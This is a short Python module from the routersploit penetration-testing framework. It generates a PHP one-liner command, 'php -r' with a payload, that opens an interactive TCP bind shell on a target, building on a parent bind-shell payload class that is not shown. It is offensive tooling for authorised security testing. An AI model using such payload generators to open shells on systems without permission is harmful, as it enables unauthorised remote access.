from routersploit.core.exploit import *
from routersploit.modules.payloads.php.bind_tcp import Exploit as PHPBindTCP


class Exploit(PHPBindTCP):
    __info__ = {
        "name": "PHP Bind TCP One-Liner",
        "description": "Creates interactive tcp bind shell by using php one-liner.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>"  # routersploit module
        ),
    }

    cmd = OptString("php", "PHP binary")

    def generate(self):
        payload = super(Exploit, self).generate()

        cmd = '{} -r "{}"'.format(self.cmd, payload)
        return cmd
